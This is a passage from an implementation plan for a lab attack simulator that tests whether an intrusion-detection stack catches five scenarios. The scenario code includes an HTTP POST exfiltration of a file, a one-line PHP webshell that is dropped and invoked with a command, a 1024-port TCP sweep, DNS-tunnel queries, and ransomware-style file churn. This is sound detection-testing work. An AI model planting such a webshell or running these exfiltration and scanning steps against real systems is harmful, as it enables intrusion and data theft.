    subprocess.run(
        [
            "curl", "-s", "-X", "POST",
            "-H", "Content-Type: text/csv",
            "--data-binary", f"@{file_path}",
            f"http://{target_host}/upload",
        ],
        check=False,
        timeout=10,
    )

    # 3. dig a .invalid (NXDOMAIN-guaranteed) domain through victim-server — zeek.dns event
    subprocess.run(
        ["dig", "+short", "+time=2", "+tries=1", "suspicious-c2-test.invalid", f"@{target_host}"],
        check=False,
        timeout=5,
    )
```

- [ ] **Step 2: Run the data-exfil tests**

```bash
cd data-plane/simulator
python -m venv .venv && . .venv/bin/activate
pip install /home/aditya/Documents/IntelliFIM/data-plane/schemas
pip install -e .[dev]
pytest tests/test_scenarios.py::test_data_exfil_writes_file_and_runs_curl_dig -v
pytest tests/test_scenarios.py::test_scenario_exports_contract -v
pytest -v   # full suite
```

Expected:
- `test_data_exfil_writes_file_and_runs_curl_dig` → **PASS**
- The 5 contract tests still PASS
- Full suite passes EXCEPT for the 4 remaining behavior tests (webshell, port-scan, dns-tunnel, ransomware) which still fail with `NotImplementedError` / `AttributeError`

- [ ] **Step 3: Stage + ask user to commit**

```bash
deactivate
rm -rf .venv
cd ../..
rm -rf data-plane/schemas/build/
git add data-plane/simulator/src/simulator/scenarios/data_exfil.py
git status
```

Suggested commit message: `feat(simulator): implement data-exfil scenario (FIM + zeek http/dns/conn)`

---

## Task 6: Implement `webshell-drop` scenario

**Files:**
- Modify: `data-plane/simulator/src/simulator/scenarios/webshell_drop.py` (replace stub `run()`)

- [ ] **Step 1: Implement `webshell_drop.py`**

Replace the entire contents of `data-plane/simulator/src/simulator/scenarios/webshell_drop.py`:

```python
"""webshell-drop scenario — FIM + zeek.http."""
from __future__ import annotations

import os
import subprocess
import time


NAME = "webshell-drop"
DESCRIPTION = "Drop a PHP webshell into /victim-data and curl it with a command arg"

VICTIM_DATA = "/victim-data"

_WEBSHELL_BODY = "<?php system($_GET['c']); ?>\n"


def run(target_host: str) -> None:
    os.makedirs(VICTIM_DATA, exist_ok=True)
    file_path = os.path.join(VICTIM_DATA, f"cmd_{int(time.time())}.php")
    # FIM `created` event
    with open(file_path, "w") as f:
        f.write(_WEBSHELL_BODY)

    # zeek.http event — curl the webshell with a suspicious query string
    subprocess.run(
        ["curl", "-s", f"http://{target_host}/{os.path.basename(file_path)}?c=id"],
        check=False,
        timeout=10,
    )
```

- [ ] **Step 2: Run the webshell-drop tests**

```bash
cd data-plane/simulator
python -m venv .venv && . .venv/bin/activate
pip install /home/aditya/Documents/IntelliFIM/data-plane/schemas
pip install -e .[dev]
pytest tests/test_scenarios.py::test_webshell_drop_writes_php_and_curls_with_query -v
pytest tests/test_scenarios.py -v   # all scenarios
```

Expected: `test_webshell_drop_writes_php_and_curls_with_query` → **PASS**. The 5 contract tests + data-exfil + webshell-drop tests pass.

- [ ] **Step 3: Stage + ask user to commit**

```bash
deactivate
rm -rf .venv
cd ../..
rm -rf data-plane/schemas/build/
git add data-plane/simulator/src/simulator/scenarios/webshell_drop.py
git status
```

Suggested commit message: `feat(simulator): implement webshell-drop scenario (FIM + zeek.http)`

---

## Task 7: Implement `port-scan` scenario

**Files:**
- Modify: `data-plane/simulator/src/simulator/scenarios/port_scan.py` (replace stub `run()`)

- [ ] **Step 1: Implement `port_scan.py`**

Replace the entire contents of `data-plane/simulator/src/simulator/scenarios/port_scan.py`:

```python
"""port-scan scenario — zeek.conn flurry via pure asyncio (no nmap)."""
from __future__ import annotations

import asyncio


NAME = "port-scan"
DESCRIPTION = "Burst TCP-connect sweep against victim-server ports 1..1024"

PORTS_TO_SCAN = range(1, 1025)
BATCH_SIZE = 32
CONNECT_TIMEOUT = 0.5


async def _probe(target_host: str, port: int) -> None:
    """Open + immediately close a TCP connection. Tolerates refusal/timeout."""
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(target_host, port),
            timeout=CONNECT_TIMEOUT,
        )
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
    except (OSError, asyncio.TimeoutError, ConnectionRefusedError):
        pass


async def _scan(target_host: str) -> None:
    ports = list(PORTS_TO_SCAN)
    for batch_start in range(0, len(ports), BATCH_SIZE):
        batch = ports[batch_start:batch_start + BATCH_SIZE]
        await asyncio.gather(*(_probe(target_host, p) for p in batch))


def run(target_host: str) -> None:
    asyncio.run(_scan(target_host))
```

- [ ] **Step 2: Run the port-scan tests**

```bash
cd data-plane/simulator
python -m venv .venv && . .venv/bin/activate
pip install /home/aditya/Documents/IntelliFIM/data-plane/schemas
pip install -e .[dev]
pytest tests/test_scenarios.py::test_port_scan_attempts_many_ports -v
```

Expected: **PASS**. (The test monkeypatches `asyncio.open_connection` so no real network I/O happens.)

- [ ] **Step 3: Stage + ask user to commit**

```bash
deactivate
rm -rf .venv
cd ../..
rm -rf data-plane/schemas/build/
git add data-plane/simulator/src/simulator/scenarios/port_scan.py
git status
```

Suggested commit message: `feat(simulator): implement port-scan scenario (asyncio TCP sweep)`

---

## Task 8: Implement `dns-tunnel` scenario

**Files:**
- Modify: `data-plane/simulator/src/simulator/scenarios/dns_tunnel.py` (replace stub `run()`)

- [ ] **Step 1: Implement `dns_tunnel.py`**

Replace the entire contents of `data-plane/simulator/src/simulator/scenarios/dns_tunnel.py`:

```python
"""dns-tunnel scenario — zeek.dns burst with random-base32 subdomains."""
from __future__ import annotations

import base64
import os
import subprocess


NAME = "dns-tunnel"
DESCRIPTION = "50 DNS queries with long random subdomains under exfil.tunnel.invalid"

QUERY_COUNT = 50
DOMAIN = "exfil.tunnel.invalid"


def _random_label() -> str:
    """20 random bytes → base32 → lowercase (32 chars, DNS-label-safe)."""
    return base64.b32encode(os.urandom(20)).decode("ascii").lower().rstrip("=")


def run(target_host: str) -> None:
    for _ in range(QUERY_COUNT):
        fqdn = f"{_random_label()}.{DOMAIN}"
        subprocess.run(
            ["dig", "+short", "+time=2", "+tries=1", fqdn, f"@{target_host}"],
            check=False,
            timeout=5,
        )
```

- [ ] **Step 2: Run the dns-tunnel tests**

```bash
cd data-plane/simulator
python -m venv .venv && . .venv/bin/activate
pip install /home/aditya/Documents/IntelliFIM/data-plane/schemas
pip install -e .[dev]
pytest tests/test_scenarios.py::test_dns_tunnel_issues_many_dig_calls -v
```

Expected: **PASS** (50 dig calls captured, 50 distinct random subdomains).

- [ ] **Step 3: Stage + ask user to commit**

```bash
deactivate
rm -rf .venv
cd ../..
rm -rf data-plane/schemas/build/
git add data-plane/simulator/src/simulator/scenarios/dns_tunnel.py
git status
```

Suggested commit message: `feat(simulator): implement dns-tunnel scenario (50 random-subdomain queries)`

---

## Task 9: Implement `ransomware-rapid` scenario

**Files:**
- Modify: `data-plane/simulator/src/simulator/scenarios/ransomware_rapid.py` (replace stub `run()`)

- [ ] **Step 1: Implement `ransomware_rapid.py`**

Replace the entire contents of `data-plane/simulator/src/simulator/scenarios/ransomware_rapid.py`:

```python
"""ransomware-rapid scenario — FIM rapid create/truncate/delete churn."""
from __future__ import annotations

import os


NAME = "ransomware-rapid"
DESCRIPTION = "Rapidly create, truncate, and delete 30 files in /victim-data"

VICTIM_DATA = "/victim-data"
FILE_COUNT = 30
CONTENT = b"A" * 1024   # 1 KB


def run(target_host: str) -> None:
    os.makedirs(VICTIM_DATA, exist_ok=True)
    for i in range(FILE_COUNT):
        path = os.path.join(VICTIM_DATA, f"doc_{i}.txt")
        with open(path, "wb") as f:
            f.write(CONTENT)
        # Truncate to 0
        with open(path, "wb") as f:
            f.write(b"")
        os.unlink(path)
```

- [ ] **Step 2: Run the ransomware-rapid tests + full suite**

```bash
cd data-plane/simulator
python -m venv .venv && . .venv/bin/activate
pip install /home/aditya/Documents/IntelliFIM/data-plane/schemas
pip install -e .[dev]
pytest tests/test_scenarios.py::test_ransomware_rapid_churns_files -v
pytest -v   # full suite
```

Expected:
- `test_ransomware_rapid_churns_files` → **PASS**
- Full suite → **17 passed** (4 kafka_tail + 3 runner + 5 contract + 5 behavior)

- [ ] **Step 3: Stage + ask user to commit**

```bash
deactivate
rm -rf .venv
cd ../..
rm -rf data-plane/schemas/build/
git add data-plane/simulator/src/simulator/scenarios/ransomware_rapid.py
git status
```

Suggested commit message: `feat(simulator): implement ransomware-rapid scenario (FIM churn)`

---

## Task 10: Dockerfile + local build verification

**Files:**
- Create: `data-plane/simulator/Dockerfile`

- [ ] **Step 1: Write Dockerfile**

`data-plane/simulator/Dockerfile`:

```dockerfile
# data-plane/simulator/Dockerfile
# Build context must be data-plane/ (one level up) so we can COPY both
# schemas/ and simulator/.
FROM python:3.12-slim AS base

ENV PYTHONDONTWRITEBYTECODE=1 \
    PYTHONUNBUFFERED=1 \
    PIP_NO_CACHE_DIR=1

RUN apt-get update && apt-get install -y --no-install-recommends \
        curl dnsutils ca-certificates \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

COPY schemas /app/schemas
RUN pip install /app/schemas

COPY simulator /app/simulator
RUN pip install /app/simulator

ENTRYPOINT ["intellifim-simulator"]
CMD ["--help"]
```

- [ ] **Step 2: Build the image**

```bash
cd data-plane
docker build -f simulator/Dockerfile -t intellifim-simulator:dev .
```

Expected: image builds successfully. ~30–60s on first build.

- [ ] **Step 3: Smoke `--list` inside the image (no compose needed yet)**

```bash
docker run --rm intellifim-simulator:dev --list
```

Expected output:
```
available scenarios:
  data-exfil           Multi-layer chain: write sensitive file, exfil via HTTP POST, DNS lookup to low-rep domain
  dns-tunnel           50 DNS queries with long random subdomains under exfil.tunnel.invalid
  port-scan            Burst TCP-connect sweep against victim-server ports 1..1024
  ransomware-rapid     Rapidly create, truncate, and delete 30 files in /victim-data
  webshell-drop        Drop a PHP webshell into /victim-data and curl it with a command arg
```

- [ ] **Step 4: Run unit tests inside the image to confirm the env works**

```bash
docker run --rm -v "$(pwd)/simulator":/work -w /work --entrypoint sh intellifim-simulator:dev \
    -c "pip install --quiet -e .[dev] && pytest -v"
```

Expected: **17 passed**.

- [ ] **Step 5: Stage + ask user to commit**

```bash
cd /home/aditya/Documents/IntelliFIM
git add data-plane/simulator/Dockerfile
git status
```

Suggested commit message: `feat(simulator): add Dockerfile (python:3.12-slim + curl + dnsutils)`

---

## Task 11: docker-compose.yml integration (profiles: [sim])

**Files:**
- Modify: `data-plane/docker-compose.yml` (add `simulator` service block with `profiles: [sim]`)

- [ ] **Step 1: Identify insertion point**

```bash
grep -nE "^services:|^volumes:|^  [a-z]" data-plane/docker-compose.yml | tail -10
```

Insert the new block at the END of the `services:` section (just before the top-level `volumes:` block).

- [ ] **Step 2: Add the simulator service block**

In `data-plane/docker-compose.yml`, immediately before the top-level `volumes:` block, add:

```yaml
  simulator:
    profiles: [sim]
    build:
      context: .                       # data-plane/ — one level above simulator/
      dockerfile: simulator/Dockerfile
    image: intellifim-simulator:dev
    container_name: simulator
    networks: [victims, bus]
    depends_on:
      kafka:
        condition: service_healthy
    environment:
      KAFKA_BOOTSTRAP: "kafka:9092"
      TARGET_HOST: "victim-server"
      TOPIC: "threat.scores"
      HOST_ID: "001"
      THRESHOLD_SCORE: "30.0"
      TIMEOUT_SECONDS: "60"
    volumes:
      - ${FIM_MONITORED_HOST_DIR:-./monitored}:/victim-data
```

- [ ] **Step 3: Validate compose config**

```bash
cd data-plane
docker compose --env-file .env.dataplane config --services | sort
```

Expected: 25 services listed (24 normal + `simulator`). Order is alphabetical; check that `simulator` appears.

```bash
docker compose --env-file .env.dataplane config --profiles
```

Expected: `sim` listed as an available profile.

- [ ] **Step 4: Verify `up -d` keeps stack at 24 (simulator hidden by profile)**

```bash
docker compose --env-file .env.dataplane up -d
sleep 10
docker compose ps | grep -v "(healthy)" | grep -v "^NAME" | grep -v "^$" || true
docker compose ps --format "{{.Service}}" | sort -u | wc -l
```

Expected: 24 services running (simulator NOT among them because the `sim` profile isn't active).

- [ ] **Step 5: Verify `--profile sim run --rm simulator --list` works**

```bash
docker compose --env-file .env.dataplane --profile sim run --rm simulator --list
```

Expected: list of 5 scenarios.

- [ ] **Step 6: Stage + ask user to commit**

```bash
cd /home/aditya/Documents/IntelliFIM
git add data-plane/docker-compose.yml
git status
```

Suggested commit message: `feat(simulator): wire simulator into Compose stack (profiles: [sim])`

---

## Task 12: Host wrapper scripts

**Files:**
- Create: `data-plane/scripts/run-scenario.sh`
- Create: `data-plane/scripts/run-all-scenarios.sh`

- [ ] **Step 1: Write run-scenario.sh**

`data-plane/scripts/run-scenario.sh`:

```bash
#!/usr/bin/env bash
# Run a single attack scenario.
# Usage: ./scripts/run-scenario.sh <scenario-name> [--threshold N] [--timeout S]
set -euo pipefail
cd "$(dirname "$0")/.."   # data-plane/
exec docker compose --env-file .env.dataplane --profile sim run --rm simulator "$@"
```

- [ ] **Step 2: Write run-all-scenarios.sh**

`data-plane/scripts/run-all-scenarios.sh`:

```bash
#!/usr/bin/env bash
# Run all 5 scenarios sequentially with a 5s settle between each.
# Exit 0 if every scenario was detected; non-zero if any failed.
set -uo pipefail
cd "$(dirname "$0")/.."   # data-plane/

SCENARIOS=(data-exfil webshell-drop port-scan dns-tunnel ransomware-rapid)
PASS=()
FAIL=()

for s in "${SCENARIOS[@]}"; do
  echo "=== $s ==="
  if ./scripts/run-scenario.sh "$s"; then
    PASS+=("$s")
  else
    FAIL+=("$s")
  fi
  echo ""
  sleep 5   # give policy-engine sliding window time to settle between attacks
done

echo "================================================================"
echo "PASS (${#PASS[@]}/${#SCENARIOS[@]}): ${PASS[*]:-}"
echo "FAIL (${#FAIL[@]}/${#SCENARIOS[@]}): ${FAIL[*]:-}"
[ ${#FAIL[@]} -eq 0 ]
```

- [ ] **Step 3: Make executable**

```bash
chmod +x data-plane/scripts/run-scenario.sh data-plane/scripts/run-all-scenarios.sh
```

- [ ] **Step 4: Smoke each scenario individually against the live stack**

The stack should still be up from Task 11. If not:
```bash
cd data-plane && ./scripts/init-secrets.sh && docker compose --env-file .env.dataplane up -d && cd ..
sleep 30   # let consumers warm up
```

Then run each scenario:
```bash
cd data-plane
./scripts/run-scenario.sh data-exfil
echo "exit=$?"
./scripts/run-scenario.sh webshell-drop
echo "exit=$?"
./scripts/run-scenario.sh port-scan
echo "exit=$?"
./scripts/run-scenario.sh dns-tunnel
echo "exit=$?"
./scripts/run-scenario.sh ransomware-rapid
echo "exit=$?"
```

Expected: each command prints `✓ DETECTED score=X reason=...` and exits 0.

If a scenario times out with `✗ NO DETECTION`, debug:
1. Check `docker compose logs policy-engine | tail -50` for evidence of the event reaching policy-engine.
2. Check kafka-ui at `http://localhost:8080` for messages on `events.normalized` and `threat.scores`.
3. Increase the threshold to confirm low-score detections: `./scripts/run-scenario.sh data-exfil --threshold 5.0`.
4. Increase the timeout: `./scripts/run-scenario.sh data-exfil --timeout 120`.

- [ ] **Step 5: Smoke the run-all wrapper**

```bash
./scripts/run-all-scenarios.sh
```

Expected output ends with:
```
PASS (5/5): data-exfil webshell-drop port-scan dns-tunnel ransomware-rapid
FAIL (0/5):
```

And exits 0.

- [ ] **Step 6: Verify the negative-detection gate is real**

```bash
./scripts/run-scenario.sh data-exfil --threshold 999
echo "exit=$?"
```

Expected: `✗ NO DETECTION within 60s`, exit 2. (Threshold 999 is unreachable.)

- [ ] **Step 7: Stage + ask user to commit**

```bash
cd /home/aditya/Documents/IntelliFIM
git add data-plane/scripts/run-scenario.sh \
        data-plane/scripts/run-all-scenarios.sh
git status
```

Suggested commit message: `feat(simulator): add run-scenario.sh + run-all-scenarios.sh host wrappers`

---

## Task 13: README + DoD walk-through

**Files:**
- Modify: `data-plane/README.md` (add simulator + scenarios docs)

- [ ] **Step 1: Update services list in README**

Find the "What's in the box" section. Update the **Dev tooling** bullet to add the simulator:

Change:
```markdown
- **Dev tooling:** `kafka-ui`, `victim-server`, `victim-client`
```

To:
```markdown
- **Dev tooling:** `kafka-ui`, `victim-server`, `victim-client`
- **Simulation lab (on-demand, profile `sim`):** `simulator` (5 curated attack scenarios with built-in `threat.scores` verification, see [simulator/](simulator/))
```

(The simulator stays excluded from the "24 services" count since `profiles: [sim]` keeps it hidden from `up -d`.)

- [ ] **Step 2: Add a new "Run attack scenarios" section**

Add this section to `data-plane/README.md` just before the existing "## Tear down" heading:

```markdown
## Run attack scenarios

The simulation lab lives at [simulator/](simulator/) (sub-project #8). It ships 5 curated scenarios that target `victim-server`; each verifies that the data plane detects the attack by tailing `threat.scores` for up to 60 seconds.

```bash
# From data-plane/:
./scripts/run-scenario.sh --list           # see all 5 scenarios
./scripts/run-scenario.sh data-exfil       # run one scenario
./scripts/run-all-scenarios.sh             # run all 5 sequentially
```

Scenarios:
- `data-exfil` — FIM (sensitive file) + zeek.http (POST) + zeek.dns (.invalid lookup)
- `webshell-drop` — FIM (cmd.php) + zeek.http (?c=id query string)
- `port-scan` — zeek.conn (1024-port asyncio sweep)
- `dns-tunnel` — zeek.dns (50 random subdomains under exfil.tunnel.invalid)
- `ransomware-rapid` — FIM (30 file create/truncate/delete cycles)

Each scenario exits `0` on detection (`✓ DETECTED score=X reason=...`), `2` on timeout (`✗ NO DETECTION`).

**Override the threshold or timeout:**
```bash
./scripts/run-scenario.sh data-exfil --threshold 10.0 --timeout 120
```

**Cleanup** — file-based scenarios leave artifacts in `monitored/`:
```bash
rm -rf monitored/sensitive_* monitored/cmd_*.php monitored/doc_*
```
```

- [ ] **Step 3: DoD walk-through on a fresh stack**

This is the final acceptance step. Assumes no uncommitted changes.

```bash
cd data-plane

# DoD #1 — pytest green
cd simulator
python -m venv .venv && . .venv/bin/activate
pip install /home/aditya/Documents/IntelliFIM/data-plane/schemas
pip install -e .[dev]
pytest -v
deactivate
rm -rf .venv
cd ..
```
Expected: **17 passed** in the simulator suite.

```bash
# DoD #2 — fresh `up -d` brings up 24 services (simulator stays hidden)
docker compose --env-file .env.dataplane up -d
sleep 30
docker compose ps --format "{{.Service}}" | sort -u | wc -l
docker compose ps --format "{{.Service}}" | grep -c "^simulator$" || true
```
Expected: 24 services running, 0 simulators (until invoked).

```bash
# DoD #3 — --list works
./scripts/run-scenario.sh --list
```
Expected: 5 scenarios listed.

```bash
# DoD #4 — --help works
./scripts/run-scenario.sh --help
```
Expected: argparse help text printed.

```bash
# DoD #5 — all 5 scenarios pass end-to-end
./scripts/run-all-scenarios.sh
```
Expected: `PASS (5/5)`, exit 0.

```bash
# DoD #6 — negative-detection sentinel
./scripts/run-scenario.sh data-exfil --threshold 999
echo "exit=$?"
```
Expected: `✗ NO DETECTION within 60s`, exit 2.

```bash
# DoD #7 — kafka-ui spot check (manual)
# Open http://localhost:8080 in a browser; click `events.normalized` and `threat.scores`;
# confirm messages have landed on both topics since the scenarios ran.
```

```bash
# DoD #8 — no leaked containers
docker ps -a --format "{{.Names}}" | grep "^simulator$" || echo "no leaked simulator container (expected)"
```
Expected: no match (because `--rm`).

- [ ] **Step 4: Stage README + ask user to commit**

```bash
cd /home/aditya/Documents/IntelliFIM
git add data-plane/README.md
git status
```

Suggested commit message: `docs(simulator): document simulation lab in data-plane README`

---

## Post-merge checklist (after PR merges to main)

1. Sync local `main`:
   ```bash
   git checkout main && git pull --ff-only
   ```
2. Update memory files:
   - `~/.claude/projects/-home-aditya-Documents-IntelliFIM/memory/MEMORY.md`:
     - Update sub-project count to 8/9.
     - Move "next up" pointer from #8 to #9 (Observability + IaC scaffolding).
     - Add a line for the new shipped sub-project.
   - `~/.claude/projects/-home-aditya-Documents-IntelliFIM/memory/project_intellifim_roadmap.md`:
     - Mark row 8 ✅ SHIPPED `YYYY-MM-DD` PR #N squash `<sha>`.
     - Mark row 9 as **next up**.
     - Append a "From #8" v2/v3 deferral block (the §13 list from the spec).
     - Append new patterns to "Critical patterns established in sub-projects" section.
   - Create `~/.claude/projects/-home-aditya-Documents-IntelliFIM/memory/project_intellifim_simulation_lab_shipped.md` as the frozen snapshot.
   - Update `project_intellifim_v1_shipped.md`: note that simulator is the 25th service but only materialized under `profiles: [sim]`; test total 249 → 259.

---

## Plan self-review

### Spec coverage (each spec section → task that implements it)

| Spec section | Implemented in |
|---|---|
| §1 Goal | Tasks 0–13 (end-to-end) |
| §2 Architecture (Python 3.12 + aiokafka + curl/dig + asyncio + profile-gated) | Tasks 0 (deps), 1 (kafka_tail), 7 (asyncio scan), 10 (Dockerfile apt), 11 (compose profile) |
| §3 Scope (in/out) | Whole plan respects scope; §11 deferrals not implemented |
| §4.1–§4.5 5 scenarios | Tasks 5–9, one per scenario |
| §5 Verification (kafka-tail gate) | Task 1 (`wait_for_match` + `_extract_update` + `_is_match`) + Task 3 (`run_and_verify`) |
| §6 HTTP/network interactions | Tasks 5–9 (scenarios use curl/dig/asyncio against TARGET_HOST) |
| §7 CLI (argparse + exit codes) | Task 3 (`__main__.py` + `runner.py`) + Task 12 (host wrapper) |
| §8 Schemas & storage (no new ones) | Acknowledged; only consumes `ThreatScoreUpdate` |
| §9.1 New Compose block | Task 11 |
| §9.2 Stack count (24 normal, 25 transient) | Task 11 (DoD verification) |
| §10 Repo layout | Tasks 0–13 (each file maps) |
| §11.1 Unit tests (~10 new) | Task 1 (4 kafka_tail) + Task 3 (3 runner) + Task 4 (5 contract + 5 behavior tests with scenarios filling them in across Tasks 5–9) |
| §11.3 8 DoD items | Task 13 |
| §11.4 Smoke verification | Task 12 (run-all-scenarios.sh) |
| §12 Error handling table | Task 3 (CLI/runner exit codes 1–4) + Task 5–9 (`check=False` on subprocess) |
| §13 v2 deferrals | Not implemented (documented in spec, will appear in roadmap memory) |

No gaps.

### Placeholder scan
- No "TBD" / "TODO" / "implement later" / "fill in".
- Every test step shows full code.
- Every implementation step shows full code.
- Every command is exact.

### Type / method-name consistency
- `_extract_update` / `_is_match` / `wait_for_match` — defined in Task 1, called in Task 3.
- `dispatch(name) -> ModuleType` / `run_and_verify(*, name, target_host, bootstrap, topic, host_id, threshold, timeout_seconds) -> int` — defined in Task 3, used in `__main__.py` (same task).
- `SCENARIOS: dict[str, ModuleType]` — defined in Task 2, used in Tasks 3 (CLI list + dispatch).
- Each scenario module exports `NAME: str`, `DESCRIPTION: str`, `run(target_host: str) -> None` — defined in Task 2 stubs, implemented in Tasks 5–9, asserted in Task 4 contract tests.
- `VICTIM_DATA = "/victim-data"` constant — declared in `data_exfil.py`, `webshell_drop.py`, `ransomware_rapid.py` (Tasks 5/6/9); patched in test fixture (Task 4).
- ENTRYPOINT + console-script — `intellifim-simulator = "simulator.__main__:main"` (Task 0 pyproject), `ENTRYPOINT ["intellifim-simulator"]` (Task 10 Dockerfile), `main()` defined in Task 3.

All consistent.

---

**Plan ready for execution.**
